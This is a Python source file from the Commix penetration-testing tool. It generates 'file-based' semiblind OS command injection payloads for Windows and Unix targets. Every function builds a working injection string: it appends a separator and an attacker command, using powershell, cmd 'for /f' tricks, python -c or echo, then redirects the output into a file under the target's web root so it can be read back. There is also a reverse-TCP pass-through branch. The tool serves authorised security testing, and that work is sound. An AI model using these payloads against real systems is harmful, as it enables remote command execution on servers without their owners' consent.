#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

"""
The "file-based" technique on semiblind OS command injection.
The available "file-based" payloads.
"""

from src.utils import menu
from src.utils import settings

"""
File-based decision payload (check if host is vulnerable). 
"""
def decision(separator, TAG, OUTPUT_TEXTFILE):

  if settings.TARGET_OS == "win":
    payload = (separator +
              "powershell.exe -InputFormat none Add-Content " +
              OUTPUT_TEXTFILE + " " + TAG
              ) 
  else:
    payload = (separator +
              "echo " + TAG + ">" + settings.WEB_ROOT + OUTPUT_TEXTFILE
              ) 

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):

  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
    payload = (separator +
              "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
              python_payload +
              "') do @set /p =%i< nul"
              )
  else:
    payload = (separator +
              "$(python -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")"
               ) 

  if settings.USER_AGENT_INJECTION == True or \
     settings.REFERER_INJECTION == True or \
     settings.HOST_INJECTION == True or \
     settings.CUSTOM_HEADER_INJECTION == True :
    payload = payload.replace("\n", separator)
  else:
    if not settings.TAMPER_SCRIPTS['base64encode'] and \
       not settings.TAMPER_SCRIPTS['hexencode']:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
  
  if settings.TFB_DECIMAL == True:
    payload = (separator +cmd)

  elif settings.TARGET_OS == "win":
    payload = (separator +
              "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
              "powershell.exe -InputFormat none write-host (cmd /c \"" +
              cmd + 
              "\")\"') do @set /p =%i " + ">" + OUTPUT_TEXTFILE + "< nul"
              ) 
  else:
    # if settings.USER_AGENT_INJECTION == True or \
    #    settings.REFERER_INJECTION == True or \
    #    settings.HOST_INJECTION == True or \
    #    settings.CUSTOM_HEADER_INJECTION == True:
    #   if not settings.DEL in cmd:
    #     cmd = "echo $(" + cmd + ")"
    payload = (separator +
              cmd + ">" + settings.WEB_ROOT + OUTPUT_TEXTFILE
              )

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
  if settings.TARGET_OS == "win":
    if settings.REVERSE_TCP:
      payload = (separator +cmd + " "
                )
    else:
      python_payload = settings.WIN_PYTHON_DIR + " -c \"import os; os.system('" + cmd + ">" + OUTPUT_TEXTFILE + "')\""
      payload = (separator +
                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
                python_payload +
                "') do @set /p =%i< nul"
                )
  else:
    payload = (separator +
              "$(python -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
              )

  # New line fixation
  if settings.USER_AGENT_INJECTION == True or \
     settings.REFERER_INJECTION == True or \
     settings.HOST_INJECTION == True or \
     settings.CUSTOM_HEADER_INJECTION == True:
    payload = payload.replace("\n", separator)
  else:
    if not settings.TAMPER_SCRIPTS['base64encode'] and \
       not settings.TAMPER_SCRIPTS['hexencode']:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")

  return payload

# eof